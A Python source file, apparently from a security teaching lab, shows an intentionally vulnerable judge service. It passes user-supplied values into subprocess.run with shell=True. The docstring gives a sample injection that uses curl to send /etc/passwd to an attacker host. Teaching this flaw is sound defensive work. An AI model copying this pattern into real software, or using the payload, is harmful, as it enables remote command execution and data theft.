# app/services/judge_service.py — VULNERABLE version
# Lab 7.3: OS Command Injection (IS-03)
# DO NOT USE IN PRODUCTION — educational purposes only
#
# Bug demonstrated:
#   IS-03: subprocess.run() with shell=True and user-controlled arguments.
#          The shell interprets metacharacters, enabling command injection.

import subprocess
from pathlib import Path


# IS-03: Command injection via shell=True
# VULNERABLE: language and file_path come from user-supplied submission data
def run_in_sandbox(
    source_path: Path,
    language: str,       # user-supplied: "python", "cpp", "java" — or anything else
    timeout_sec: int = 5,
) -> subprocess.CompletedProcess:
    """Execute submitted code for judging.

    BUG (IS-03 — ASVS V1.2.5 violation):
      shell=True causes the OS to spawn /bin/sh -c "..." which interprets
      shell metacharacters. An attacker can inject:

      language = "python; curl http://attacker.com/$(cat /etc/passwd)"
        → runs python and exfiltrates /etc/passwd in the same shell

      source_path containing spaces or semicolons also becomes injectable
      because the path is interpolated into the shell command string.

    The combination of shell=True + user-controlled arguments = RCE.
    """
    # VULNERABLE: f-string builds a shell command with user-controlled values
    # shell=True means /bin/sh interprets the entire string
    cmd = f"{language} {source_path} --timeout {timeout_sec}"
    return subprocess.run(
        cmd,
        shell=True,       # BUG: shell metacharacters are interpreted
        capture_output=True,
        timeout=timeout_sec + 2,
    )
